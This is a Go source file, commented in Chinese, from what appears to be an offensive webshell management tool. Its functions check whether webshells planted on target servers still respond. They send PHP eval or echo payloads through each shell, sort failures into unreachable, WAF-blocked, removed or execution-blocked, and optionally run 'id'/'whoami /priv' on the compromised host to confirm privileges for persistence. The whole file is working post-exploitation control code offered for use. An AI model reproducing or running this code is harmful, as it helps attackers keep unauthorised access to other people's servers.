package webshell

// 存活巡检：这条会话现在还能不能用。
//
// 「还能用」有三种不同程度的失效，必须分开报，否则人在页面上看到的红绿点毫无
// 信息量：
//   1. 连不上（网络/目标下线/端口变了）
//   2. 连上了但不是我的马（404 页、WAF 拦截页、马被删后成了目录索引）
//   3. 连上了也是我的马，但执行被禁（disable_functions / 权限降级）
//
// 所以 probe 默认做一次「标记回环」：发一个只 echo 固定串的载荷，检查标记与
// 内容都对得上。deep=true 时再跑一条 id/whoami，把当前身份记下来——权限维持
// 的第一步永远是「确认现在还是不是我」。

import (
	"context"
	"fmt"
	"strings"
	"time"
)

// ProbeResult 是一次巡检的结果。
type ProbeResult struct {
	Name    string `json:"name"`
	Alive   bool   `json:"alive"`
	// State 是给人看的判定：ok / unreachable / not_mine / exec_blocked。
	State string `json:"state"`
	// Detail 是一句可读的说明（失败时带上远端响应片段）。
	Detail string `json:"detail,omitempty"`
	// Identity 是 deep=true 时拿到的当前身份（id / whoami 输出）。
	Identity string `json:"identity,omitempty"`
	LatencyMs int64 `json:"latency_ms"`
	Mode      string `json:"mode,omitempty"`
	Egress    string `json:"egress,omitempty"`
}

// probeToken 是一段固定的回环串。用随机后缀让「远端恰好返回同样内容」的
// 概率归零；内容本身无害，不构成任何操作。
const probeEcho = "pojun-probe-ok"

// Probe 巡检一条会话。deep=true 时额外执行身份命令。
func (m *Manager) Probe(ctx context.Context, name string, deep bool, timeout time.Duration) (ProbeResult, error) {
	sess, err := m.Get(name)
	if err != nil {
		return ProbeResult{}, err
	}
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	res := ProbeResult{Name: name, Egress: egressLabel(&sess)}
	start := time.Now()
	defer func() { res.LatencyMs = time.Since(start).Milliseconds() }()

	token := probeEcho + "-" + randLetters(4)
	var (
		out  string
		mode string
	)
	// 按类型选最轻的探测：
	//   php/php_raw —— 走 eval 协议 echo，能同时验证「标记链路」是否完好
	//   jsp/aspx    —— 命令型只能跑 echo，回显里找 token
	if sess.Type == "php" || sess.Type == "php_raw" {
		out, err = runPHPCode(ctx, name, sess, "echo '"+token+"';", timeout)
		mode = "eval"
		if err != nil {
			// eval 协议不通时再退一步：可能这匹马本来就是命令型，用 echo 试。
			if out2, mode2, err2 := execCmd(ctx, name, sess, "echo "+token, timeout); err2 == nil {
				out, mode, err = out2, mode2, nil
			}
		}
	} else {
		out, mode, err = execCmd(ctx, name, sess, "echo "+token, timeout)
	}

	if err != nil {
		// 拦截页不是「连不上」：马可能还在，只是 WAF/网关把这次请求挡了。
		// 这两者对处置的含义完全不同（前者要查 WAF 规则，后者要查网络/目标）。
		if strings.Contains(err.Error(), "拦截页") {
			res.State = "not_mine"
			res.Detail = err.Error()
			return res, nil
		}
		res.State = "unreachable"
		res.Detail = err.Error()
		return res, nil
	}
	res.Mode = mode
	if !strings.Contains(out, token) {
		res.State = "not_mine"
		res.Detail = fmt.Sprintf("响应里没有回环标记（不是这条会话的马，或执行被拦）；响应前 160 字: %s", brief(out, 160))
		return res, nil
	}
	res.Alive = true
	res.State = "ok"

	if deep {
		// 身份命令按马的类型猜系统：aspx 基本是 Windows IIS，jsp 两者皆有可能，
		// php 多为 Linux。猜错只影响这一条探测的可读性，不影响存活结论。
		idCmd := "id 2>/dev/null || whoami"
		if sess.Type == "aspx" {
			idCmd = "whoami & whoami /priv"
		}
		if idOut, md, ierr := execCmd(ctx, name, sess, idCmd, timeout); ierr == nil {
			res.Identity = strings.TrimSpace(idOut)
			if res.Mode == "" {
				res.Mode = md
			}
		} else {
			res.Detail = "存活但身份查询失败: " + ierr.Error()
		}
	}
	return res, nil
}

// ProbeAll 批量巡检（同一任务内）。并发度固定 4：再多也没有意义——目标往往
// 是同一条链路上的机器，并发过高只会触发对方的连接数限制。
func (m *Manager) ProbeAll(ctx context.Context, taskID int64, deep bool, timeout time.Duration) []ProbeResult {
	list := m.List(taskID)
	results := make([]ProbeResult, len(list))
	sem := make(chan struct{}, 4)
	done := make(chan int, len(list))
	for i, v := range list {
		go func(i int, name string) {
			sem <- struct{}{}
			defer func() { <-sem }()
			r, err := m.Probe(ctx, name, deep, timeout)
			if err != nil {
				r = ProbeResult{Name: name, State: "unreachable", Detail: err.Error()}
			}
			results[i] = r
			done <- i
		}(i, v.Name)
	}
	for range list {
		<-done
	}
	return results
}
